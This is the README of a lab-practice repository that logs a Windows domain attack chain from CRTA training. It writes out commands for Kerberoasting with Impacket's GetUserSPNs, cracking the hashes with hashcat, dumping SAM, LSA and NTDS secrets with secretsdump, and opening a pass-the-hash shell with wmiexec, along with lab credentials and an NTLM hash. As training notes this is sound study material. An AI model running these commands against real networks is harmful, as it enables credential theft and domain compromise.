# 🛡️ Windows Domain Attacks - CRTA Lab

This repository includes notes and commands used to perform domain attacks during my CRTA lab practice using Impacket and Hashcat.

## 🔧 Tools Used

- 🐍 Impacket (v0.12.0)
- 🔓 Hashcat (v6.2.6)
- 🐚 Kali Linux

---

## 🕵️‍♂️ Scenario Summary

### 1. 🧠 Dumping Service Principal Names (SPNs)

```bash
PYTHONPATH=.. python3 GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP -request -outputfile tgs_hashes
```

### 2. 🔓 Cracking TGS Hashes with Hashcat

```bash
hashcat -m 13100 tgs_hashes /path/to/rockyou.txt --force
```

- 🗝️ Result: Two passwords cracked → `Passw0rd`

### 3. 🔍 Dumping Hashes with secretsdump

```bash
PYTHONPATH=.. python3 secretsdump.py 'green.local/iis_service:Passw0rd@192.168.1.40'
```

- ✅ SAM, LSA, NTDS hashes successfully dumped

### 4. 🎯 Getting Shell with wmiexec

```bash
wmiexec.py -hashes :f533c601d800c9941a817daf1ea67ade green.local/administrator@192.168.1.40
```

---

## 📁 File Descriptions

- `tgs_hashes`: Contains cracked TGS hashes
- `wordlists/rockyou.txt`: Common password wordlist used for cracking (not included)

---

## ⚠️ Disclaimer

This repository is for educational purposes only. Do not use it for unauthorized access.
